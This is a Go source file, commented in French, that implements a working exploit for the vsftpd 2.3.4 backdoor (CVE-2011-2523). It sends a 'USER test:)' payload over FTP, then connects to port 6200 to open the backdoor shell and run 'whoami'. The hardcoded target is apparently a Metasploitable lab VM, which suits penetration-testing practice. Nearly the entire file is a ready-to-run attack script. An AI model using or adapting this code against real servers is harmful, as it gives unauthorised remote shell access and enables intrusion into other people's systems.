package main

import (
	"fmt"
	"net"
	"time"
)

// Exploit représente une interface générique pour les modules d'exploit
type Exploit interface {
	Run(target string) error
}

// VsftpdExploit implémente l'exploit pour CVE-2011-2523
type VsftpdExploit struct {
	ftpPort      string // Port FTP (défaut: 21)
	backdoorPort string // Port de la backdoor (6200)
}

// NewVsftpdExploit crée une instance de l'exploit
func NewVsftpdExploit(ftpPort, backdoorPort string) *VsftpdExploit {
	return &VsftpdExploit{
		ftpPort:      ftpPort,
		backdoorPort: backdoorPort,
	}
}

// Run exécute l'exploit contre la cible
func (e *VsftpdExploit) Run(target string) error {
	// Étape 1 : Connexion au port FTP (21)
	ftpAddr := fmt.Sprintf("%s:%s", target, e.ftpPort)
	conn, err := net.DialTimeout("tcp", ftpAddr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("échec connexion FTP %s: %v", ftpAddr, err)
	}
	defer conn.Close()

	// Lire la bannière FTP
	buffer := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buffer)
	if err != nil {
		return fmt.Errorf("échec lecture bannière: %v", err)
	}
	fmt.Printf("Bannière FTP: %s\n", string(buffer[:n]))

	// Étape 2 : Envoyer USER avec :)
	payload := "USER test:)\n"
	_, err = conn.Write([]byte(payload))
	if err != nil {
		return fmt.Errorf("échec envoi payload USER: %v", err)
	}

	// Lire la réponse
	n, err = conn.Read(buffer)
	if err != nil {
		return fmt.Errorf("échec lecture réponse USER: %v", err)
	}
	fmt.Printf("Réponse USER: %s\n", string(buffer[:n]))

	// Étape 3 : Envoyer PASS (non nécessaire, mais pour simuler)
	_, err = conn.Write([]byte("PASS dummy\n"))
	if err != nil {
		return fmt.Errorf("échec envoi PASS: %v", err)
	}

	// Attendre que la backdoor s'ouvre (port 6200)
	time.Sleep(2 * time.Second)

	// Étape 4 : Connexion au port 6200 pour le shell
	backdoorAddr := fmt.Sprintf("%s:%s", target, e.backdoorPort)
	shellConn, err := net.DialTimeout("tcp", backdoorAddr, 5*time.Second)
	if err != nil {
		return fmt.Errorf("échec connexion backdoor %s: %v", backdoorAddr, err)
	}
	defer shellConn.Close()
	fmt.Println("Connecté au shell backdoor sur port 6200")

	// Interagir avec le shell
	shellConn.Write([]byte("whoami\n"))
	n, err = shellConn.Read(buffer)
	if err != nil {
		return fmt.Errorf("échec lecture shell: %v", err)
	}
	fmt.Printf("Résultat commande: %s\n", string(buffer[:n]))

	return nil
}

func main() {
	target := "192.168.1.100" // Remplace par l'IP de ta VM Metasploitable
	exploit := NewVsftpdExploit("21", "6200")
	err := exploit.Run(target)
	if err != nil {
		fmt.Printf("Erreur lors de l'exploit: %v\n", err)
	}
}
